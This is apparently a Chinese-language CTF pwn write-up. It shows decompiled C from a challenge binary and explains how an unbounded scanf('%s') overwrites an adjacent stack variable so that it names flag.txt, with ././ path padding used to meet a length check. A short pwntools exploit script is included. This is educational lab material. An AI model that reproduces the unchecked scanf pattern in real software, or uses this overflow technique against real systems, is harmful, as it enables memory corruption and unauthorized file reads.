---
title: Easist scanf 覆盖
date: 2018-04-24 15:43:07
tags: pwn
layout: post
---
# scanf 变量覆盖
灰常灰常简单的一题
<!--more-->

题目链接：
[B3t4.M3Ee][1]
## 0x00 源码
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int result; // eax
  int v4; // [rsp+8h] [rbp-48h]
  int v5; // [rsp+Ch] [rbp-44h]
  char s1; // [rsp+10h] [rbp-40h]
  __int64 v7; // [rsp+20h] [rbp-30h]
  __int64 v8; // [rsp+28h] [rbp-28h]
  __int64 v9; // [rsp+30h] [rbp-20h]
  __int64 v10; // [rsp+38h] [rbp-18h]
  int v11; // [rsp+40h] [rbp-10h]
  char v12; // [rsp+44h] [rbp-Ch]
  unsigned __int64 v13; // [rsp+48h] [rbp-8h]

  v13 = __readfsqword(0x28u);
  printf("Enter password to authentic yourself : ", argv, envp);
  fflush(_bss_start);
  __isoc99_scanf("%s", &s1);
  if ( strncmp(&s1, "kaiokenx20", 0xAuLL) )
  {
    puts("Incorrect password. Closing connection.");
    exit(0);
  }
  puts("Enter case number: ");
  printf("\n\t 1) Application_1", "kaiokenx20");
  printf("\n\t 2) Application_2");
  printf("\n\t 3) Application_3");
  printf("\n\t 4) Application_4");
  printf("\n\t 5) Application_5");
  printf("\n\t 6) Application_6");
  printf("\n\t 7) Flag");
  printf("\n\n\t Enter choice :- ");
  fflush(_bss_start);
  __isoc99_scanf("%d", &v4);
  switch ( v4 )
  {
    case 1:
      v7 = 3474298655558951218LL;
      v8 = 3847821640488804656LL;
      v9 = 7149858464072819505LL;
      v10 = 7221017546570621237LL;
      v11 = 1952539694;
      v12 = 0;
      break;
    case 2:
      v7 = 7147605565415700579LL;
      v8 = 3631416849257871156LL;
      v9 = 4121973650644951905LL;
      v10 = 4049125503535429937LL;
      v11 = 1952539694;
      v12 = 0;
      break;
    case 3:
      v7 = 3617341790454624824LL;
      v8 = 3702634411308757558LL;
      v9 = 7076898166606619443LL;
      v10 = 7219893850032333154LL;
      v11 = 1952539694;
      v12 = 0;
      break;
    case 4:
      v7 = 7221577417837786465LL;
      v8 = 7363447393777498210LL;
      v9 = 7017788206782754871LL;
      v10 = 3474021582806464825LL;
      v11 = 1952539694;
      v12 = 0;
      break;
    case 5:
      v7 = 7161347266051257652LL;
      v8 = 7147275711155430960LL;
      v9 = 7076672766706148656LL;
      v10 = 3486685753473249589LL;
      v11 = 1952539694;
      v12 = 0;
      break;
    case 6:
      v7 = 3919088685579186483LL;
      v8 = 7076672569207763513LL;
      v9 = 7005179029631677796LL;
      v10 = 7149238120417998694LL;
      v11 = 1952539694;
      v12 = 0;
      break;
    case 7:
      v7 = 8392585648256674918LL;
      LOBYTE(v8) = 0;
      puts("You don't have the required privileges to view the flag, yet.");
      exit(0);
      return result;
    default:
      break;
  }
  v5 = print_record(&v7);
  if ( v5 == -1 )
    printf("\nNo such record exists. Please verify your choice.");
  fflush(_bss_start);
  puts("\n");
  return 0;
}
```
## 0x01 分析
从源码中可以看出漏洞
  __isoc99_scanf("%s", &s1);
这里可以覆盖栈上的v7然后使其变成flag.txt
就可以读到flag
有处限制是长度要是36 于是可以用././././flag.txt来绕过

## 0x02 exploit
```python
from pwn import *
p=process("./4-23")
p.recv();
p.sendline("kaiokenx20"+"0xdead"+"././././././././././././././flag.txt"+"\x00")
print p.recv()
p.sendline("8");

p.interactive();
```

## 0x03
题目本身是很简单的
但是在做题自己测试的时候明白了几个小姿势：
char a,b,c,d,e,f,g;
scanf("%s",&g);
赋值覆盖顺序是gabcdef

可以用./././././来绕过长度限制




  [1]: https://github.com/B3t4M3Ee/banana/tree/master/Pwn/4-23